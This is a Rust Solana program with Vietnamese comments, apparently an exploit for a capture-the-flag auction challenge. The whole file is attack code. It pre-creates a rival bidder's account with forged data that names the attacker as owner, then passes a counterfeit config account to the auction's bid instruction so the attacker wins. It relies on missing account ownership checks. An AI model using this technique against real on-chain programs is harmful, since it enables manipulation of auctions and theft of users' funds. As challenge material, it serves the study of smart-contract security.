use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::{invoke, invoke_signed},
    pubkey::Pubkey,
    system_instruction,
    rent::Rent,
    sysvar::Sysvar,
};
use borsh::{BorshDeserialize, BorshSerialize};

// Cần định nghĩa lại các struct từ chương trình auction
#[derive(BorshSerialize, BorshDeserialize)]
pub struct Config {
    pub first_bidder: Pubkey,
    pub has_bid: bool,
}

#[derive(BorshSerialize, BorshDeserialize)]
pub struct BidderData {
    pub owner: Pubkey,
    pub bid: u64,
}

#[derive(BorshSerialize, BorshDeserialize)]
enum AuctionInstruction {
    InitializeBidder {},
    Bid { vault_bump: u8, winner_bump: u8, amount: u64 },
}

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();

    // Lấy danh sách các tài khoản cần thiết
    let user_account = next_account_info(account_iter)?; // 0. Signer
    let user_config_account = next_account_info(account_iter)?; // 1. Writable
    let noobmaster_account = next_account_info(account_iter)?; // 2.
    let noobmaster_config_account = next_account_info(account_iter)?; // 3. Writable
    let fake_config_account = next_account_info(account_iter)?; // 4. Signer, Writable
    let auction_program_account = next_account_info(account_iter)?; // 5.
    let real_config_account = next_account_info(account_iter)?; // 6.
    let vault_account = next_account_info(account_iter)?; // 7. Writable
    let winner_account = next_account_info(account_iter)?; // 8. Writable
    let system_program_account = next_account_info(account_iter)?; // 9.
    
    // --- Phần 1: Ngăn chặn Noobmaster ---
    
    // Tìm bump cho PDA bidder của NoobMaster
    let (_noobmaster_pda, noobmaster_bump) = Pubkey::find_program_address(&[noobmaster_account.key.as_ref(), b"BIDDER"], auction_program_account.key);

    // Tạo PDA bidder cho noobmaster bằng CPI
    invoke_signed(
        &system_instruction::create_account(
            user_account.key,
            noobmaster_config_account.key,
            Rent::get()?.minimum_balance(256),
            256,
            auction_program_account.key,
        ),
        &[user_account.clone(), noobmaster_config_account.clone()],
        &[&[noobmaster_account.key.as_ref(), b"BIDDER", &[noobmaster_bump]]],
    )?;

    // Ghi dữ liệu giả mạo vào PDA của Noobmaster với owner là pubkey của chúng ta
    let fake_bidder_data = BidderData {
        owner: *user_account.key, // Owner là chúng ta
        bid: 0,
    };
    fake_bidder_data.serialize(&mut &mut (*noobmaster_config_account.data).borrow_mut()[..])?;

    // --- Phần 2: Chuẩn bị và thực hiện đấu giá ---

    // 2.1. Khởi tạo PDA bidder cho chính chúng ta
    let ix_init_bidder = solana_program::instruction::Instruction {
        program_id: *auction_program_account.key,
        accounts: vec![
            solana_program::instruction::AccountMeta::new(*user_account.key, true),
            solana_program::instruction::AccountMeta::new(*user_config_account.key, false),
            solana_program::instruction::AccountMeta::new_readonly(*system_program_account.key, false),
        ],
        data: AuctionInstruction::InitializeBidder{}.try_to_vec().unwrap(),
    };

    invoke(
        &ix_init_bidder,
        &[
            user_account.clone(),
            user_config_account.clone(),
            system_program_account.clone(),
        ],
    )?;
    
    // 2.2. Chuẩn bị dữ liệu cho tài khoản config giả mạo
    let fake_config_data = Config {
        first_bidder: *user_account.key, // Đặt chúng ta là first_bidder
        has_bid: false,
    };
    fake_config_data.serialize(&mut &mut (*fake_config_account.data).borrow_mut()[..])?;


    // 2.3. Thực hiện đấu giá với config giả mạo
    let (_vault_pda, vault_bump) = Pubkey::find_program_address(&["VAULT".as_bytes()], auction_program_account.key);
    let (_winner_pda, winner_bump) = Pubkey::find_program_address(&["WINNER".as_bytes()], auction_program_account.key);
    let amount_to_bid = 4_100_000_000; // Bid 4.1 SOL

    let ix_bid = solana_program::instruction::Instruction {
        program_id: *auction_program_account.key,
        accounts: vec![
            solana_program::instruction::AccountMeta::new(*user_account.key, true),
            solana_program::instruction::AccountMeta::new(*user_config_account.key, false),
            solana_program::instruction::AccountMeta::new(*fake_config_account.key, false), // Dùng config giả
            solana_program::instruction::AccountMeta::new(*vault_account.key, false),
            solana_program::instruction::AccountMeta::new(*winner_account.key, false),
            solana_program::instruction::AccountMeta::new_readonly(*system_program_account.key, false),
        ],
        data: AuctionInstruction::Bid{vault_bump, winner_bump, amount: amount_to_bid}.try_to_vec().unwrap(),
    };

    invoke(
        &ix_bid,
        &[
            user_account.clone(),
            user_config_account.clone(),
            fake_config_account.clone(),
            vault_account.clone(),
            winner_account.clone(),
            system_program_account.clone(),
        ]
    )?;

    Ok(())
}